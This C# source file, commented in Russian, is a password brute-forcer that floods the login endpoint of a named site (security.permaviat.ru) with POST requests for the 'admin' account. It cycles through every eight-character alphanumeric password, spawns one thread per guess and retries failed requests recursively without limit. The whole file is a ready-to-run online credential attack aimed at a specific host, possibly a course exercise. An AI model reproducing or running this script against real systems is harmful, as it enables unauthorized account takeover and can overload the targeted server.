using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace BruteForce
{
    internal class Program
    {
        // Неизменный токен для сравнения с ответом сервера
        public static string InvalidToken = "4u39flaf03c15u4a8863ab21U0119Te";

        // Алфавит для генерации паролей: заглавные, строчные буквы и цифры
        public static string Abc = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

        // Делегат для обработки паролей
        public delegate void Passwordhandler(string password);

        // Время начала работы программы
        public static DateTime TimeStart;

        static void Main(string[] args)
        {
            // Запоминаем время старта
            TimeStart = DateTime.Now;

            // Запускаем генерацию паролей длиной 8 символов
            // Для каждого сгенерированного пароля вызываем CheckPassword
            CreatePassword(8, CheckPassword);
        }

        // Метод для отправки запроса на авторизацию с паролем
        public static void SingIn(string password)
        {
            try
            {
                // URL endpoint для авторизации
                string url = "http://security.permaviat.ru/ajax/login_user.php";

                // Создаем HTTP запрос
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";

                // Формируем данные для отправки (логин всегда admin)
                string postData = $"login=admin&password={password}";
                byte[] postBytes = Encoding.ASCII.GetBytes(postData);
                request.ContentLength = postBytes.Length;

                // Записываем данные в поток запроса
                using (Stream stream = request.GetRequestStream())
                {
                    stream.Write(postBytes, 0, postBytes.Length);
                }

                // Получаем ответ от сервера
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                // Читаем ответ сервера
                string responseFromServer;
                using (var reader = new StreamReader(response.GetResponseStream()))
                {
                    responseFromServer = reader.ReadToEnd();
                }

                // Проверяем, является ли токен неверным
                string status = responseFromServer == InvalidToken ? "FALSE" : "TRUE";

                // Вычисляем время, прошедшее с начала работы
                TimeSpan delta = DateTime.Now - TimeStart;

                Console.WriteLine($"{delta:hh\\:mm\\:ss} :: {password} - {status}");
            }
            catch (Exception)
            {
                // В случае ошибки выводим сообщение и повторяем попытку
                TimeSpan delta = DateTime.Now - TimeStart;
                Console.WriteLine($"{delta:hh\\:mm\\:ss} :: {password} - ошибка");

                SingIn(password);
            }
        }

        // Метод для запуска проверки пароля в отдельном потоке
        public static void CheckPassword(string password)
        {
            Thread thread = new Thread(() => SingIn(password));
            thread.Start();
        }

        // Метод для генерации всех возможных комбинаций паролей заданной длины
        public static void CreatePassword(int numberChar, Action<string> processPassword)
        {
            char[] chars = Abc.ToCharArray();

            // Массив индексов для текущей комбинации
            int[] indices = new int[numberChar];

            // Общее количество комбинаций (длина алфавита в степени длины пароля)
            long totalCombinations = (long)Math.Pow(chars.Length, numberChar);

            // Перебираем все возможные комбинации
            for (long i = 0; i < totalCombinations; i++)
            {
                // Собираем пароль из символов по текущим индексам
                var sb = new StringBuilder(numberChar);
                for (int j = 0; j < numberChar; j++)
                {
                    sb.Append(chars[indices[j]]);
                }

                // Передаем сгенерированный пароль на обработку
                processPassword(sb.ToString());

                // Увеличиваем индексы для перехода к следующей комбинации
                for (int j = numberChar - 1; j >= 0; j--)
                {
                    indices[j]++;
                    if (indices[j] < chars.Length)
                    {
                        break;
                    }

                    indices[j] = 0;
                }
            }
        }
    }
}
